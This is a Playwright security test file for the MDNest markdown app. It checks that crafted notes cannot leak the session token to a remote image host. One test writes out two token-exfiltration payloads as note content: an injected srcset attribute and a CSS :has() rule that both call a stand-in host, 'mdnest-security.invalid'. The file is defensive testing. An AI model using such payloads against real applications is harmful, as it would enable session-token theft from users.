// Remote images are fulfilled locally, including on a vulnerable baseline.
// No note content or credential is sent to a real external image host.
import { test, expect } from '@playwright/test';

const NS = 'testing_workspace';
const USER = process.env.MDNEST_USER || 'e2e';
const PASS = process.env.MDNEST_PASSWORD || 'e2epass123';
const HOST = 'https://mdnest-security.invalid';
const REMOTE = /^https?:\/\/mdnest-security\.invalid\//;
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a9X8AAAAASUVORK5CYII=', 'base64');

async function login(page) {
  await page.goto('/');
  await page.fill('input[name=username]', USER);
  await page.fill('input[name=password]', PASS);
  await page.getByRole('button', { name: 'Sign in', exact: true }).click();
  await expect(page.locator('.ns-label, .ns-select')).toBeVisible();
}

async function auth(request) {
  const response = await request.post('/api/auth/login', { data: { username: USER, password: PASS } });
  expect(response.ok()).toBeTruthy();
  return { Authorization: `Bearer ${(await response.json()).token}` };
}

async function captureImages(page) {
  const requests = [];
  await page.route(REMOTE, async (route) => {
    requests.push({ url: route.request().url(), authorization: route.request().headers().authorization });
    await route.fulfill({ contentType: 'image/png', body: PNG, headers: { 'Cache-Control': 'no-store' } });
  });
  return requests;
}

test('crafted images and note stylesheets cannot leak the token; uploaded images still display', async ({ page, request }) => {
  const headers = await auth(request);
  const suffix = Date.now();
  const path = `image-security-${suffix}.md`;
  const noteURL = `/api/note?ns=${NS}&path=${encodeURIComponent(path)}`;
  const imageName = `image-security-${suffix}.png`;
  const content = `![local image](${imageName})\n\n![](<photo.png" srcset="${HOST}/stolen>)\n\n<div><style>.preview-pane:has(img[src*="token=eyJ"]) { background-image:url("${HOST}/css-probe"); }</style></div>\n`;
  const external = await captureImages(page);
  try {
    expect((await request.post(noteURL, { headers, data: content })).ok()).toBeTruthy();
    expect((await request.post(`/api/upload?ns=${NS}&path=${encodeURIComponent(path)}`, {
      headers, multipart: { file: { name: imageName, mimeType: 'image/png', buffer: PNG } },
    })).ok()).toBeTruthy();
    const before = await (await request.get(noteURL, { headers })).text();
    await login(page);
    await page.locator('.tree-label', { hasText: path }).click();
    await page.getByTitle('Preview only', { exact: true }).click();
    const image = page.locator('.preview-pane img[alt="local image"]');
    await expect.poll(() => image.evaluate((el) => el.complete && el.naturalWidth > 0)).toBe(true);
    expect(await page.locator('.preview-pane [srcset]').count()).toBe(0);
    expect(await page.locator('.preview-pane style').count()).toBe(0);
    const sources = await page.locator('.preview-pane img').evaluateAll((images) => images.map((img) => img.src));
    for (const src of sources) {
      expect(new URL(src).origin).toBe(new URL(page.url()).origin);
      expect(new URL(src).pathname).toMatch(/^\/api\/files\//);
    }
    await page.getByTitle('Editor only', { exact: true }).click();
    await page.getByRole('button', { name: 'Live', exact: true }).click();
    await expect(page.locator('.ProseMirror').first()).toBeVisible();
    await expect.poll(() => page.locator('.milkdown img').first().evaluate((el) => el.complete && el.naturalWidth > 0)).toBe(true);
    await page.waitForTimeout(1200);
    expect(external).toEqual([]);
    expect(await (await request.get(noteURL, { headers })).text()).toBe(before);
  } finally {
    await request.delete(noteURL, { headers }).catch(() => {});
    await request.delete(`/api/note?ns=${NS}&path=${encodeURIComponent(imageName)}`, { headers }).catch(() => {});
  }
});

test('remote images render in Preview and Live without receiving MDNest credentials', async ({ page, request }) => {
  const headers = await auth(request);
  const path = `remote-image-security-${Date.now()}.md`;
  const noteURL = `/api/note?ns=${NS}&path=${encodeURIComponent(path)}`;
  const content = `Remote ![remote image](${HOST}/remote.png?size=2) end.\n\nProtocol ![protocol image](//mdnest-security.invalid/protocol.png) end.\n`;
  const external = await captureImages(page);
  try {
    expect((await request.post(noteURL, { headers, data: content })).ok()).toBeTruthy();
    const before = await (await request.get(noteURL, { headers })).text();
    await login(page);
    await page.locator('.tree-label', { hasText: path }).click();
    await page.getByTitle('Preview only', { exact: true }).click();
    for (const alt of ['remote image', 'protocol image']) {
      const image = page.locator(`.preview-pane img[alt="${alt}"]`);
      await expect.poll(() => image.evaluate((el) => el.complete && el.naturalWidth > 0)).toBe(true);
    }
    await page.getByTitle('Editor only', { exact: true }).click();
    await page.getByRole('button', { name: 'Live', exact: true }).click();
    await expect(page.locator('.milkdown img')).toHaveCount(2);
    await expect.poll(() => page.locator('.milkdown img').evaluateAll((images) => images.every((el) => el.complete && el.naturalWidth > 0))).toBe(true);
    await page.waitForTimeout(1200);
    expect(external.length).toBeGreaterThanOrEqual(2);
    const token = await page.evaluate(() => localStorage.getItem('mdnest_token'));
    expect(token).toBeTruthy();
    for (const image of external) {
      expect(new URL(image.url).searchParams.has('token')).toBe(false);
      expect(image.url).not.toContain(token);
      expect(image.authorization).toBeUndefined();
    }
    expect(await (await request.get(noteURL, { headers })).text()).toBe(before);
  } finally {
    await request.delete(noteURL, { headers }).catch(() => {});
  }
});
